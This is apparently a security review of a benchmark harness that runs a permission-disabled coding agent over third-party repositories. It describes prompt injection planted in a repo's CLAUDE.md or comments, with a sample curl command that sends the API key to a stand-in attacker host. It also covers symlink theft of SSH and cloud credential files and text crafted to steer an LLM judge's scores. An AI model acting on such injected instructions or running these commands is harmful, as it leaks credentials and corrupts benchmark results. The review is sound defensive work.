# Security Review — `feat/crb-direction1-harness`

Commit: 529ecd2

**Scope:** `git diff main...HEAD` — 7 files, +1209 lines, all newly added (evaluated greenfield)
**Date:** 2026-08-18
**Based on:** Stage-1 code-fact-check (k=3, most-severe-wins) supplied by the review orchestrator
**Calibration:** This is research/experiment tooling run by a solo operator on a workstation, not a
production service. Severities below are calibrated to that: nothing here is internet-exposed, and
the "attacker" in every scenario is *content in a third-party repository the harness deliberately
clones and feeds to an agent*. That threat model is real (the harness's whole purpose is to run an
LLM over other people's code with a paid credential in scope), but blast radius is one workstation,
one API key, and the integrity of the benchmark numbers.

---

## Trust Boundary Map

```
B1 (new): [external/code-review-benchmark/offline/results/benchmark_data.json — vendored
           third-party dataset]                → [slug_for() + FORK_ORG f-string, no validation]
                                               → [local filesystem path under DST_ROOT + git clone URL]

B2 (new): [third-party PR repo contents at /repo, incl. any repo-local CLAUDE.md]
                                               → [headless Claude Code, --dangerously-skip-permissions,
                                                  no tool allowlist]
                                               → [container env holding ANTHROPIC_API_KEY, rw /repo,
                                                  shared npm volume, unrestricted network egress]

B3 (new): [files the agent wrote into the rw-mounted clone]
                                               → [host-side harvest: git status --porcelain | awk | cp]
                                               → [git-tracked runs/review-arms/crb-pipeline/<slug>/]

B4 (new): [agent-authored rubric markdown]     → [comments_from_rubric() — text copied verbatim]
                                               → [benchmark_data.json → judge LLM prompt (paid)]

B5 (new): [host ANTHROPIC_API_KEY]             → [RUN.md runbook: export MARTIAN_API_KEY=...]
                                               → [OpenAI-compat client; base URL defaults to
                                                  https://api.withmartian.com/v1 if unset]

B6 (new): [the merged upstream fix — the "answer key"]
                                               → [ref scrub + remote removal in the clone (git-local only)]
                                               → [agent under test; network egress is NOT scrubbed]
```

The dominant new boundary is **B2**: this harness's entire job is to take code it does not control
and hand it to an agent that has been explicitly stripped of its permission prompts, in a process
that also holds a live billing credential. Everything downstream (B3, B4) carries agent output —
which is influenced by B2's untrusted input — into git-tracked files and into a second paid LLM's
prompt. B6 is a *measurement-integrity* boundary shaped like a security control: the scrub is
airtight against `git log --all` (Stage 1 verified this) but says nothing about the network.

No escalation block is emitted: no plaintext secret is committed, no TLS verification is disabled,
no shell/SQL injection from user-facing input exists (subprocess list form is used throughout), and
there are no privileged endpoints. `--dangerously-skip-permissions` was considered against
escalation pattern #2 and does not match it — it is a deliberate, documented property of an
experimental sandbox, not a missing auth check on a reachable endpoint. It is Finding 1 instead.

---

## Findings

#### 1. Prompt injection from the reviewed repository reaches a live API key, the network, and a rw mount, with permission prompts disabled

**Severity:** High
**Location:** `runs/review-arms/crb-pipeline/run-host.sh:155-167`
**Boundary:** B2
**Move:** #1 (trace trust boundaries), #6 (follow the secrets)
**Confidence:** High (that the exposure exists) / Medium (that any specific benchmark fork currently
carries hostile content — these are real upstream PRs from grafana, keycloak, sentry, cal.com,
discourse, so present likelihood is low)
**Legibility-target:** for-author

**Evidence:**

```
  docker run --rm -u node -w /repo \
    -e ANTHROPIC_API_KEY \
    -v "$clone":/repo \
    -v "$INST_HOME":/home/node/.claude \
    -v cc-review-npm-cache:/home/node/.npm \
    node:22 \
    npx -y @anthropic-ai/claude-code@"$CC_VERSION" \
      -p "/code-review main" \
      --model "$MODEL" \
      --output-format stream-json --verbose \
      --dangerously-skip-permissions \
      --max-budget-usd "$BUDGET" \
```

and, from the script's own header at `run-host.sh:34-36`:

```
#   * The benchmark PRs are third-party upstream code with no CLAUDE.md of their
#     own in most cases — the canon instances had one. Repo-local instructions
#     load as they would for any real user.
```

The header states the property that makes this a boundary: a `CLAUDE.md` shipped by the reviewed
repository loads as instructions. Combine that with `--dangerously-skip-permissions` (no tool-use
confirmation), `-e ANTHROPIC_API_KEY` (a live billing credential in the container environment), and
a container on Docker's default bridge network (no `--network` flag anywhere in the file), and the
attack is a single file: a benchmark fork containing `CLAUDE.md`, `.claude/settings.json`, a README,
or even a source comment that instructs the reviewer to run a shell command. The agent has Bash and
does not ask. `curl -d "$ANTHROPIC_API_KEY" https://attacker.example` exfiltrates the credential;
`/repo` is mounted read-write so the injected agent can also modify the code it is being scored on.
Note the injection surface is not limited to instruction-shaped files — the agent reads the whole
diff, and this arm deliberately selects the PRs with the *most* review comments, i.e. the most text.

`--max-budget-usd` caps runaway *spend* but does nothing about exfiltration; the stolen key has no
such cap once it is off the machine.

**Recommendation:** Use a dedicated, low-limit, rapidly-rotated API key for this arm and never the
operator's primary key — this single change removes most of the impact. Additionally, put the
container behind an egress allowlist (a proxy permitting only `api.anthropic.com`, or a custom
docker network plus firewall rule) rather than the default bridge; that closes exfiltration *and*
Finding 5's containment gap in one move. Record the chosen mitigation in the runbook so the
`--dangerously-skip-permissions` decision reads as bounded rather than unconditional.

---

#### 2. Untrusted third-party repo content is written verbatim into git-tracked paths, re-opening prior security finding A6

**Severity:** Medium
**Location:** `runs/review-arms/crb-pipeline/run-host.sh:167` (writer); `.gitignore:40-42` (the rule
this evades)
**Boundary:** B3
**Move:** #7 (serialization boundary — what leaves, and to where)
**Confidence:** High

**Evidence:**

```
    > "$dest/transcript.jsonl" 2> "$dest/stderr.log" || {
```

`.gitignore:40-42` records the earlier decision this contradicts:

```
# Stage-1 dry-run/live prompt snapshots are whole-repo (or foreign-repo) content shipped
# to third-party APIs — never commit them (security finding A6, 2026-07-31 review).
runs/**/prompt.txt
```

`$dest` is `runs/review-arms/crb-pipeline/<slug>/`, and nothing under it is gitignored — only
`runs/**/prompt.txt` and three `wt-*` worktree paths are. `runs/` is otherwise a tracked tree, and
sibling arms confirm the precedent: `git ls-files` shows `runs/review-arms/e7-fable-3x/**/transcript.jsonl`
and `runs/review-arms/e5-cc-builtin/**/{result.json,stderr.log}` already committed. A `stream-json
--verbose` transcript is a strict *superset* of the `prompt.txt` snapshots A6 banned: it contains
every file the agent read, quoted in full. I confirmed by inspection that the committed e7
transcripts already carry verbatim foreign-repo file bodies — including credential-shaped strings
(`sk-ant-oat01-...`) that happen to be documentation placeholders this time, but demonstrate that
whatever the reviewed repo contains lands in this repository's permanent history. For benchmark
forks of grafana/keycloak/sentry that is third-party code in your git history; for any future
instance whose repo holds a real secret, it is that secret, unrotatable out of history.

Secondary channel on the same boundary: if an injected agent (Finding 1) ever runs `env`, `printenv`,
or `echo $ANTHROPIC_API_KEY`, the key is captured into `transcript.jsonl` and committed.

**Recommendation:** Add `runs/review-arms/crb-pipeline/*/transcript.jsonl` and
`runs/review-arms/crb-pipeline/*/stderr.log` to `.gitignore` before the first paid run, under the
existing A6 comment block so the rationale stays attached. Keep `result.json`, `review.md`, and
`run-meta.json` tracked — those are the provenance that must survive. If transcripts are needed for
audit, keep them locally and reference them by path from the results doc.

---

#### 3. `slug_for()` derives a filesystem path from third-party JSON with no character allowlist; an absolute-path slug escapes `DST_ROOT` and is `rmtree`d under `--force`

**Severity:** Medium
**Location:** `scripts/crb-materialize.py:69-74` (derivation), `scripts/crb-materialize.py:151-157` (use)
**Boundary:** B1
**Move:** #2 (find the implicit sanitization assumption)
**Confidence:** Medium — the exposure is unambiguous; exploitability requires a hostile or corrupted
`benchmark_data.json`, and GitHub repository names cannot legitimately contain `/`, so this is a
hardening gap rather than a live bug.

**Evidence:**

```python
def slug_for(repo_name: str) -> str:
    """keycloak__keycloak__claude-code__PR37429__20260310 -> keycloak-PR37429."""
    parts = repo_name.split("__")
    if len(parts) < 4:
        raise ValueError(f"unexpected fork repo name: {repo_name}")
    return f"{parts[1]}-{parts[3]}".replace(".", "_")
```

and the sink:

```python
def materialize(slug, url, entry, fork, depth, force):
    dst = DST_ROOT / slug
    if dst.exists():
        if not force:
            print(f"{slug}: exists, skipping (use --force to rebuild)")
            return None
        shutil.rmtree(dst)
```

`repo_name` comes straight from `entry["reviews"][*]["repo_name"]` in a vendored third-party dataset
file (`load_prs`, lines 77-90) — data this repo fetches rather than authors. The only sanitization is
`.replace(".", "_")`, which happens to defeat `..` traversal but nothing else. `/` passes through.
The decisive detail is `pathlib` semantics: `Path("/w/external/crb-eval") / "/etc/cron.d/x-PR1"`
evaluates to `/etc/cron.d/x-PR1` — an absolute right-hand operand *discards* the root entirely. So a
`repo_name` of the form `a__/absolute/path__c__PR1__d` yields a `dst` outside `DST_ROOT`, which is
then `git clone`d into and, with `--force`, passed to `shutil.rmtree`. The same unvalidated field
feeds the clone URL at line 159 (`remote = f"{FORK_ORG}/{fork}"`); a `fork` value containing `../`
normalizes to a different GitHub owner, redirecting the clone to an attacker-chosen repository whose
contents then flow into Finding 1.

**Recommendation:** Validate immediately after derivation — `if not re.fullmatch(r"[A-Za-z0-9_.-]+", slug): raise ValueError(...)`
in `slug_for`, and the same check on `fork` before building `remote`. Belt-and-braces: assert
`DST_ROOT.resolve() in dst.resolve().parents` before the `rmtree`. Three lines, and B1 stops being a
boundary that has to be argued about.

---

#### 4. The harvest step dereferences agent-created symlinks, copying host files into a git-tracked directory

**Severity:** Medium
**Location:** `runs/review-arms/crb-pipeline/run-host.sh:193-199`
**Boundary:** B3 (with B2 as the precondition)
**Move:** #2 (implicit sanitization assumption), #4 (time-of-check to time-of-use)
**Confidence:** Medium — depends on the agent being induced to create a symlink, i.e. on Finding 1.

**Evidence:**

```bash
  mkdir -p "$dest/artifacts"
  (cd "$clone" && git status --porcelain --untracked-files=all) \
    | awk '{print $2}' | grep -E '\.(md|json)$' \
    | while read -r f; do
        mkdir -p "$dest/artifacts/$(dirname "$f")"
        cp "$clone/$f" "$dest/artifacts/$f" 2>/dev/null || true
      done
```

The filename list is entirely agent-controlled: the loop harvests whatever the reviewing agent left
in the working tree. `cp` without `-P`/`--no-dereference` follows symlinks, and it runs on the
**host**, not in the container — so a symlink the agent creates at `docs/reviews/x.md` pointing at
`/home/<user>/.ssh/id_rsa`, `~/.claude/.credentials.json`, or `~/.aws/credentials` resolves against
the *host* filesystem and copies that file into `runs/.../artifacts/`, which (per Finding 2) is
tracked and committed. The `2>/dev/null || true` guarantees the failure mode is silent either way.

Two robustness defects in the same pipeline are worth fixing alongside, though neither is
independently exploitable: `awk '{print $2}'` mis-parses rename entries (`R  old -> new` yields
`old`) and truncates any path containing a space, and git's default `core.quotePath` wraps
non-ASCII paths in quotes that survive into the `cp` argument. Those silently drop artifacts —
a measurement-integrity cost, not a security one.

**Recommendation:** Use `git status --porcelain -z --untracked-files=all` with a NUL-delimited read
and slice the path at a fixed offset instead of `awk`; add `-P` to `cp`; and skip any entry where
`[ -L "$clone/$f" ]`. Consider harvesting with `git status` restricted to the paths the pipeline is
supposed to write (`docs/reviews/`) rather than the whole tree.

---

#### 5. Answer-key containment is enforced only inside git; the container's network egress is unrestricted

**Severity:** Medium (integrity, not confidentiality)
**Location:** `scripts/crb-materialize.py:176-184` (the control), `runs/review-arms/crb-pipeline/run-host.sh:155-167` (the gap)
**Boundary:** B6
**Move:** #5 (invert the access control model — enumerate what the check does *not* cover)
**Confidence:** High that the gap exists; Medium that an agent would actually exercise it unprompted.

**Evidence:** the control, which Stage 1 verified works as described:

```python
    refs = sh(["git", "for-each-ref", "--format=%(refname)",
               "refs/heads", "refs/tags", "refs/remotes"], cwd=dst).splitlines()
    for ref in refs:
        if ref not in ("refs/heads/review", "refs/heads/main"):
            sh(["git", "update-ref", "-d", ref], cwd=dst)
    subprocess.run(["git", "remote", "remove", "origin"], cwd=dst,
                   capture_output=True, text=True)
    sh(["git", "reflog", "expire", "--expire=now", "--all"], cwd=dst)
    sh(["git", "gc", "--quiet", "--prune=now"], cwd=dst)
```

and the docstring's claim of what it buys (`crb-materialize.py:12-14`):

```
  - NO other refs and NO origin remote, so a reviewing agent cannot fetch the
    upstream future (the merged fix — the answer key) via `git log --all`.
```

The claim is scoped correctly — `git log --all` is genuinely closed, and Stage 1 confirmed guard (a)
rejects any stray commit. But the scrub is a *git-local* control facing an agent that has Bash,
WebFetch/WebSearch, and unrestricted egress. The reviewed tree self-identifies its upstream project
in a dozen places (`package.json` repository field, `go.mod` module path, license headers, CI config),
so an agent that decides to "check how this was actually resolved upstream" can `git fetch
https://github.com/grafana/grafana` or simply search the web for the PR. It need not be adversarial —
a thorough reviewer doing exactly what the pipeline asks is the likely path. The consequence is a
silently inflated recall number on a benchmark whose headline caveat is already training-data leakage
(`docs/working/crb-direction1-setup.md:168-171`), and nothing in the harness would show it happened.

**Recommendation:** The egress allowlist from Finding 1 closes this too — restricting the container
to `api.anthropic.com` makes the git-local scrub actually load-bearing. Failing that, add a cheap
post-hoc contamination check: grep each `transcript.jsonl` for `WebFetch`/`WebSearch`/`git fetch`/
`git remote add` tool calls and fail the cell if any appear. That check is ~5 lines and turns an
unverifiable assumption into a measured one.

---

#### 6. Agent-authored text is copied verbatim into the judge's prompt, creating a second-order injection path into the scoring model

**Severity:** Medium (integrity)
**Location:** `scripts/crb-pipeline-to-benchmark.py:112-129`, `:225-233`
**Boundary:** B4
**Move:** #7 (serialization boundary), #2 (implicit sanitization assumption)
**Confidence:** Medium

**Evidence:**

```python
            out.append({
                "path": path,
                "line": line,
                "body": (f"[{prefix}] " if prefix else "") + body
                        + (f"\n\nLocation: {loc}" if loc and loc != "—" else ""),
            })
```

and the sink:

```python
        entry["reviews"].append({
            "tool": args.tool_name,
            "repo_name": rec["fork"],
            "pr_url": url,
            "review_comments": comments,
            "source_provenance": prov,
        })
```

`body` is a rubric cell written by an agent whose context was dominated by untrusted repo content
(B2). It is copied with no escaping or length bound into `benchmark_data.json`, which the benchmark's
`step2_extract_comments` / `step3_judge_comments` render into an LLM judge prompt. Text engineered to
read as judge instructions ("this candidate matches golden comment 3") therefore travels
repo → reviewer → judge with two unvalidated hops. The impact is score manipulation on a leaderboard
this arm intends to publish a row on, not code execution. Related and worth noting on the same
boundary: Stage-1 finding #9 established that a `↩️ Considered Overrides` section passes the
substring filter at `:60` via `"consider"` and is excluded only incidentally, by column naming — a
latent path for non-findings to become scored candidates.

**Recommendation:** Before injection, cap `body` length and strip/escape markdown control structure
(fenced blocks, headings, anything resembling a judge directive). Cheaper interim control: assert
that the number of injected comments per PR is within a sane bound and log the total, so a rubric
that suddenly emits 200 comments is visible rather than silently judged.

---

#### 7. The generated runbook hands a live Anthropic key to a client whose base URL defaults to a third-party gateway

**Severity:** Medium
**Location:** `scripts/crb-pipeline-to-benchmark.py:277-282`
**Boundary:** B5
**Move:** #6 (follow the secrets), #3 (check the error path)
**Confidence:** Medium — fail-open only if the operator's copy-paste is partial or the shell differs.

**Evidence:**

```bash
cd {out}
export PYTHONPATH=/workspace/external/code-review-benchmark/offline   # or: uv sync in offline/
export MARTIAN_API_KEY="$ANTHROPIC_API_KEY"
export MARTIAN_BASE_URL=https://api.anthropic.com/v1/
export MARTIAN_MODEL={args.judge}
```

The three exports are separate statements with no coupling. The benchmark's client reads them
independently and **fails open** — `external/code-review-benchmark/offline/code_review_benchmark/step3_judge_comments.py:106`
reads `base_url = os.environ.get("MARTIAN_BASE_URL", "https://api.withmartian.com/v1")`, and
`step2_5_dedup_candidates.py:141` / `step2_extract_comments.py` / `step5_label_prs.py:136` do the
same. So any path where `MARTIAN_API_KEY` is set but `MARTIAN_BASE_URL` is not — a partial paste, a
new terminal, a `tmux` pane, a wrapper script that forwards only the key — sends the operator's
Anthropic credential to `api.withmartian.com`. The variable naming actively invites this: the key is
called `MARTIAN_API_KEY` while holding an Anthropic secret, so nothing about the name signals that
the destination is wrong. The equivalent instruction is duplicated at
`docs/working/crb-direction1-setup.md:127-129`.

**Recommendation:** Emit the judge steps with an inline env prefix
(`MARTIAN_API_KEY="$ANTHROPIC_API_KEY" MARTIAN_BASE_URL=... python -m ...`) so key and destination
cannot separate, or prepend a fail-closed guard:
`[ "$MARTIAN_BASE_URL" = "https://api.anthropic.com/v1/" ] || { echo "refusing: judge would call a third party"; exit 1; }`.
Same edit in the setup doc.

---

#### 8. A persistent shared npm volume undercuts the "fresh container" isolation claim

**Severity:** Low
**Location:** `runs/review-arms/crb-pipeline/run-host.sh:100-101`, `:159`
**Boundary:** B2
**Move:** #10 (dependency changes — runtime fetch surface), #1 (trust boundaries)
**Confidence:** Medium

**Evidence:**

```bash
docker run --rm -v cc-review-npm-cache:/home/node/.npm node:22 \
  chown -R node:node /home/node/.npm
```

```bash
    -v cc-review-npm-cache:/home/node/.npm \
```

The script's header (`:5-7`) frames each instance as running "in a fresh `node:22` container", and
`INST_HOME` is correctly rebuilt per instance to prevent state leaking between cells. But
`cc-review-npm-cache` is a *named* volume, mounted read-write, shared by the preflight container and
every instance container, and it outlives `--rm`. It is the one writable surface that persists across
untrusted-code executions, so it is where an injected agent (Finding 1) would try to plant something
that survives into the next cell's `npx -y @anthropic-ai/claude-code@"$CC_VERSION"` resolution. npm's
content-addressed `_cacache` with integrity hashes makes actual tarball substitution hard, which is
why this is Low and not High — but the "fresh container" claim is stronger than what the code
delivers, and that gap is worth stating in the results doc rather than discovering later.

Positively: pinning `CC_VERSION` (`:55`) rather than floating on `@latest` is the right call and
materially narrows this surface.

**Recommendation:** Either mount the cache read-only for instance containers (populate it once in the
preflight), or drop the shared volume and accept the per-instance download cost. At minimum, amend
the header comment so "fresh container" reads "fresh container, shared npm cache".

---

#### 9. Temp directories holding the payload leak on any mid-sweep failure

**Severity:** Informational
**Location:** `runs/review-arms/crb-pipeline/run-host.sh:110`, `:150`
**Boundary:** Internal — no boundary. Justified: no untrusted data crosses here; this is a cleanup/
hygiene defect on host-local state, included because it is adjacent to the payload-integrity control
that Finding 10 credits.
**Move:** #3 (check the error path)
**Confidence:** High

**Evidence:**

```bash
PF_HOME=$(mktemp -d); cp -r "$PAYLOAD_SRC/." "$PF_HOME/"; chmod -R u+w "$PF_HOME"
```

```bash
  INST_HOME=$(mktemp -d); cp -r "$PAYLOAD_SRC/." "$INST_HOME/"; chmod -R u+w "$INST_HOME"
```

Only `PAYLOAD_SRC` is covered by a trap (`trap 'rm -rf "$PAYLOAD_SRC"' EXIT`, `:84`). `PF_HOME` and
`INST_HOME` are removed by explicit `rm -rf` on the success path only; under `set -euo pipefail`, a
preflight failure or a `docker run` abort (Ctrl-C, OOM) leaves a full payload copy in `$TMPDIR`.
`mktemp -d` creates 0700 directories so this is not a disclosure, and the payload is public repo
content — it is disk churn plus the small risk that a stale `INST_HOME` is mistaken for a live one
during debugging.

**Recommendation:** Track them in a variable the EXIT trap cleans, e.g.
`trap 'rm -rf "$PAYLOAD_SRC" "${PF_HOME:-}" "${INST_HOME:-}"' EXIT`.

---

## What Looks Good

- **No shell injection anywhere in the Python.** Every `git` invocation uses `subprocess.run` with an
  argument list (`crb-materialize.py:59-66`), never `shell=True` and never an f-string command. The
  remote URL is always prefixed by the constant `FORK_ORG`, so a hostile `fork` value cannot begin
  with `-` and smuggle a `--upload-pack`-style argument. This is the single most likely place for an
  RCE in a harness that clones arbitrary repos, and it is closed by construction.
- **Payload integrity against the code under test.** Using `git archive "$PAYLOAD_REF"` into a temp
  dir rather than bind-mounting `$ROOT` (`run-host.sh:83-86`, with the rationale spelled out at
  `:79-82`) means a reviewing agent physically cannot edit the skills reviewing it, and a stray local
  edit cannot change the arm's condition mid-sweep. That is exactly the right instinct, and the
  per-instance `INST_HOME` copy extends it to cross-cell state.
- **The answer-key scrub itself.** Ref deletion + remote removal + reflog expiry + `gc --prune=now`,
  followed by a `rev-list --all --not <head>` assertion that *fails the instance* rather than warning
  (`crb-materialize.py:186-190`), is a control that verifies its own postcondition. Stage 1 confirmed
  it works as documented. Finding 5 is about a channel it never claimed to cover, not a defect in it.
- **Fail-closed preflight design.** Aborting the whole sweep unless `code-review` appears in the
  model's skill list (`run-host.sh:128-130`) is the right default for a control whose failure mode is
  *silently measuring the wrong thing*. Stage-1 finding #4 identifies a real weakness in the auth
  half of the check (`"log in" in r.lower()` vs the documented `"Not logged in"`); worth fixing, but
  the structure — abort, not warn — is correct.
- **Spend is bounded.** `--max-budget-usd "$BUDGET"` per instance (`:166`) plus the completed-cell
  skip (`:138-144`) means an injected agent cannot run up an unbounded bill inside the container, and
  a crashed sweep resumes rather than re-paying. Move #8's "what if a million of these" has a real
  answer here.
- **Provenance is treated as security-relevant state.** Keeping `instances.json` under tracked
  `runs/` because `external/` is gitignored (`crb-materialize.py:48-51`) means the slug→PR mapping
  survives a clone wipe — the results stay attributable.

---

## Summary Table

| # | Finding | Severity | Boundary | Location | Confidence |
|---|---------|----------|----------|----------|------------|
| 1 | Prompt injection → API key, network, rw mount, with permissions disabled | High | B2 | `runs/review-arms/crb-pipeline/run-host.sh:155-167` | High / Medium |
| 2 | Untrusted repo content committed to git-tracked `runs/` (re-opens A6) | Medium | B3 | `runs/review-arms/crb-pipeline/run-host.sh:167` | High |
| 3 | Unvalidated slug from third-party JSON → path escape + `rmtree` | Medium | B1 | `scripts/crb-materialize.py:69-74` | Medium |
| 4 | Harvest `cp` dereferences agent-created symlinks into tracked dir | Medium | B3 | `runs/review-arms/crb-pipeline/run-host.sh:193-199` | Medium |
| 5 | Answer-key containment is git-local; network egress unrestricted | Medium | B6 | `scripts/crb-materialize.py:176-184` | High / Medium |
| 6 | Agent text → judge prompt verbatim (second-order injection) | Medium | B4 | `scripts/crb-pipeline-to-benchmark.py:112-129` | Medium |
| 7 | Runbook key export fails open to `api.withmartian.com` | Medium | B5 | `scripts/crb-pipeline-to-benchmark.py:277-282` | Medium |
| 8 | Shared rw npm volume undercuts "fresh container" | Low | B2 | `runs/review-arms/crb-pipeline/run-host.sh:100-101` | Medium |
| 9 | `PF_HOME` / `INST_HOME` leak on failure | Informational | Internal | `runs/review-arms/crb-pipeline/run-host.sh:110` | High |

---

## Overall Assessment

The security posture here is better than the surface reads: the Python is injection-free by
construction, the payload-integrity and answer-key controls are genuinely well built (both verify
their own postconditions), and the preflight fails closed. What is missing is not correctness but
*containment* — the harness is architecturally sound about everything it can control inside git and
inside the payload, and has no story at all for the container's network or for what leaves the
container into version control. Findings 1, 2, 4, and 5 are all the same underlying gap seen from
four angles: untrusted third-party code is executed against an unbounded environment, and its
byproducts flow outward without a filter.

None of this is architectural. Every finding is fixable in place, and two edits cover most of the
risk: **(a) run the sweep with a dedicated low-limit API key behind an egress allowlist**, which
neutralizes Finding 1's impact and makes Finding 5's containment claim true; **(b) gitignore
`transcript.jsonl` and `stderr.log` under `runs/review-arms/crb-pipeline/`**, which closes Finding 2
before the first paid run creates history that cannot be rewritten. Finding 2 is the one with a
deadline attached — it costs one line now and is unfixable-in-place afterwards. Do (b) today; do (a)
before the first non-dry run.

## Goal-Alignment Note
- Answered: yes — full security-design pass on the branch diff, saved to the requested path
- Out of scope: correctness/accuracy defects already covered by Stage 1 (golden-denominator caveat, disk estimates, dedup asymmetry, `median findings` figure) are referenced only where they carry security weight, not re-litigated; no git-mutating verification was performed, per the session safety constraint
- Escalate: Finding 2 has a hard deadline — `.gitignore` must be amended before the first paid run, since committed transcripts of third-party repo content cannot be cleanly removed from history afterwards. Also worth routing to the author separately: Stage-1 finding #4 (the preflight auth-string mismatch, `"log in"` vs `"Not logged in"`) is a fail-open in a control whose whole job is to fail closed; it sits adjacent to this review's scope but I did not count it as an independent security finding.
